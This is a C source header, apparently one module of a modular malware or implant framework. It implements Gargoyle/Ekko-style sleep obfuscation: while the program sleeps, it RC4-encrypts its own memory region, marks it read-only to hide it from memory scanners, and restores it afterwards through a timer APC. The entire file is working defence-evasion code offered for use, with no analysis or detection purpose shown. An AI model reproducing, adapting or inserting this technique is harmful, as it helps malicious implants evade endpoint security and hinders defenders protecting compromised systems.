// chunk: evasion/sleep_gargoyle
// depends: (none)
// provides: ekko_sleep
// headers: windows.h
// risk: medium
// note: Gargoyle-style sleep obfuscation — marks memory PAGE_READONLY during sleep (not just RW). Memory is encrypted AND read-only, providing double protection against memory scanners. Uses waitable timer completion APC to restore permissions and decrypt.

#ifndef CHUNK_SLEEP_GARGOYLE
#define CHUNK_SLEEP_GARGOYLE

typedef NTSTATUS (NTAPI *pfnSystemFunction032_garg)(
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *data,
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *key
);

static volatile int g_gargoyle_initialized = 0;
static pfnSystemFunction032_garg g_garg_SF032 = NULL;

static int gargoyle_init(void) {
    if (g_gargoyle_initialized) return 1;

    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (!advapi) return 0;

    g_garg_SF032 = (pfnSystemFunction032_garg)GetProcAddress(advapi, "SystemFunction032");
    if (!g_garg_SF032) return 0;

    g_gargoyle_initialized = 1;
    return 1;
}

static void garg_crypt(BYTE *addr, DWORD size, BYTE *key, DWORD key_len) {
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } data_blob;
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } key_blob;

    data_blob.Buffer = addr;
    data_blob.Length = data_blob.MaximumLength = size;
    key_blob.Buffer = key;
    key_blob.Length = key_blob.MaximumLength = key_len;

    g_garg_SF032(&data_blob, &key_blob);
}

typedef struct {
    BYTE *base;
    DWORD size;
    BYTE key[16];
    DWORD orig_protect;
    HANDLE done_event;
} garg_ctx_t;

// Timer APC — fires after sleep duration, restores everything
static void CALLBACK garg_restore_apc(LPVOID arg, DWORD low, DWORD high) {
    (void)low; (void)high;
    garg_ctx_t *ctx = (garg_ctx_t *)arg;

    // Step 1: Change from READONLY to READWRITE so we can decrypt
    DWORD old;
    VirtualProtect(ctx->base, ctx->size, PAGE_READWRITE, &old);

    // Step 2: Decrypt (RC4 is symmetric)
    garg_crypt(ctx->base, ctx->size, ctx->key, sizeof(ctx->key));

    // Step 3: Restore original EXECUTE_READ protection
    DWORD dummy;
    VirtualProtect(ctx->base, ctx->size, ctx->orig_protect, &dummy);

    SetEvent(ctx->done_event);
}

static void ekko_sleep(DWORD ms, BYTE *base, DWORD size) {
    if (!g_gargoyle_initialized && !gargoyle_init()) {
        Sleep(ms);
        return;
    }

    garg_ctx_t ctx;
    ctx.base = base;
    ctx.size = size;
    ctx.done_event = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!ctx.done_event) { Sleep(ms); return; }

    // Generate per-sleep random key
    DWORD tick = GetTickCount();
    for (int i = 0; i < 16; i++)
        ctx.key[i] = (BYTE)((tick >> (i % 4 * 8)) ^ (i * 0xD1 + 0x82));

    // Create waitable timer for the restore APC
    HANDLE hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
    if (!hTimer) {
        CloseHandle(ctx.done_event);
        Sleep(ms);
        return;
    }

    // Step 1: Temporarily make region writable so we can encrypt in place
    VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &ctx.orig_protect);

    // Step 2: Encrypt the region
    garg_crypt(base, size, ctx.key, sizeof(ctx.key));

    // Step 3: Mark as PAGE_READONLY — memory is encrypted AND read-only
    // Memory scanners see: no execute permission, no write permission, encrypted garbage
    DWORD dummy;
    VirtualProtect(base, size, PAGE_READONLY, &dummy);

    // Step 4: Set timer to fire our restore APC after sleep duration
    LARGE_INTEGER due;
    due.QuadPart = -((LONGLONG)ms * 10000);
    if (!SetWaitableTimer(hTimer, &due, 0, garg_restore_apc, &ctx, FALSE)) {
        // Failed — undo everything
        VirtualProtect(base, size, PAGE_READWRITE, &dummy);
        garg_crypt(base, size, ctx.key, sizeof(ctx.key));
        VirtualProtect(base, size, ctx.orig_protect, &dummy);
        CloseHandle(hTimer);
        CloseHandle(ctx.done_event);
        Sleep(ms);
        return;
    }

    // Step 5: Enter alertable wait — timer APC fires when done
    SleepEx(ms + 5000, TRUE);

    // Wait for restore to complete
    WaitForSingleObject(ctx.done_event, 5000);

    CloseHandle(hTimer);
    CloseHandle(ctx.done_event);
    SecureZeroMemory(ctx.key, sizeof(ctx.key));
}

#endif
